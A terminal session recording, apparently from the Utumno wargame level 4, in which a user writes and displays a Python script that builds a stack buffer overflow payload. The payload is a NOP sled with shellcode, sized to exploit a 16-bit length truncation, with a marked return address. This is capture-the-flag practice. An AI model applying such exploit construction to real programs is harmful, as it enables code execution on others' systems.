[34.849, "o", "\u001b[?25l\u001b[32;73Hi\u001b[1;1H\u001b[32;73H \u001b[1;1H\u001b[32;1H\u001b[1m-- INSERT --\u001b[m\u001b[32;13H\u001b[K\u001b[32;83H0,1\u001b[11CAll\u001b[1;1H\u001b[?25h\u001b[?25limport struct\u001b[2;1H\u001b[K\u001b[32;83H2\u001b[2;1H\u001b[?25h\u001b[?25lsc = open(\"/tmp/uu4/sc.bin\", \"rb\").read()\u001b[3;1H\u001b[K\u001b[32;83H3\u001b[3;1H\u001b[?25h\u001b[?25lLEN = 65536 + 63\u001b[10C# low 16 bits 63 <= 0x3f; copy is 65599 bytes\u001b[4;1H\u001b[K\u001b[32;83H4\u001b[4;1H\u001b[?25h\u001b[?25lRET = 0xff06\u001b[14C# buf = ebp-0xff02, ret = ebp+4\u001b[5;1H\u001b[K\u001b[32;83H5\u001b[5;1H\u001b[?25h\u001b[?25la2 = bytearray(b\"\\x90\" * (RET + 4))\u001b[6;1H\u001b[K\u001b[32;83H6\u001b[6;1H\u001b[?25h\u001b[?25la2[8:8+len(sc)] = sc\u001b[7;1H\u001b[K\u001b[32;83H7\u001b[7;1H\u001b[?25h\u001b[?25la2[RET:RET+4] = struct.pack(\"<I\", 0x41414141)   # marker for gdb\u001b[8;1H\u001b[K\u001b[32;83H8\u001b[8;1H\u001b[?25h\u001b[?25la2 += b\"\\x90\" * (LEN - len(a2))\u001b[17C# memcpy reads LEN bytes\u001b[9;1H\u001b[K\u001b[32;83H9\u001b[9;1H\u001b[?25h\u001b[?25lopen(\"a2.bin\", \"wb\").write(bytes(a2))\u001b[10;1H\u001b[K\u001b[32;83H10,1\u001b[10;1H\u001b[?25h\u001b[?25lprint(\"argv[2] length:\", len(a2))\u001b[11;1H\u001b[K\u001b[32;84H1\u001b[11;1H\u001b[?25h\u001b[32;1H\u001b[K\u001b[?25l\u001b[32;83H11,0-1\u001b[8CAll\u001b[11;1H\u001b[?25h\u001b[?25l\u001b[32;83H\u001b[K\u001b[32;1H:wq\r\u001b[?2004l\u001b[>4;m\"mk.py\" [New] 11L, 454B written\r\u001b[23;2t\u001b[23;1t\r\r\r\n\u001b[?1004l\u001b[?2004l\u001b[?1l\u001b>\u001b[?1049l\u001b[23;0;0t\u001b[?25h\u001b[>4;m\u001b]3008;end=7f706ef3-ae45-40f1-bfea-eed298ec0b66;exit=success\u001b\\\u001b]3008;start=9d78970e-3c69-48a1-a354-a2c7510ef355;type=shell;machineid=ec21caf08cfdfe937b9cee1512c61281;user=utumno4;hostname=gibson-0;bootid=7b3c318e-e0a3-4e72-9221-931949256b86;pid=3;cwd=/tmp/uu4\u001b\\\u001b[?2004h\u001b]0;utumno4@utumno: /tmp/uu4\u0007utumno4@utumno:/tmp/uu4$ "]
[0.172, "o", "cat mk.py\r\r\n\u001b[?2004l\r\u001b]3008;start=99b96765-1b01-4fd1-90bd-95c10ab3cddd;type=command;machineid=ec21caf08cfdfe937b9cee1512c61281;user=utumno4;hostname=gibson-0;bootid=7b3c318e-e0a3-4e72-9221-931949256b86;pid=3;cwd=/tmp/uu4\u001b\\"]
[0.005, "o", "import struct\r\r\nsc = open(\"/tmp/uu4/sc.bin\", \"rb\").read()\r\r\nLEN = 65536 + 63          # low 16 bits 63 <= 0x3f; copy is 65599 bytes\r\r\nRET = 0xff06              # buf = ebp-0xff02, ret = ebp+4\r\r\na2 = bytearray(b\"\\x90\" * (RET + 4))\r\r\na2[8:8+len(sc)] = sc\r\r\na2[RET:RET+4] = struct.pack(\"<I\", 0x41414141)   # marker for gdb\r\r\na2 += b\"\\x90\" * (LEN - len(a2))                 # memcpy reads LEN bytes\r\r\nopen(\"a2.bin\", \"wb\").write(bytes(a2))\r\r\nprint(\"argv[2] length:\", len(a2))\r\r\n\r\r\n"]
[0.003, "o", "\u001b]3008;end=99b96765-1b01-4fd1-90bd-95c10ab3cddd;exit=success\u001b\\"]
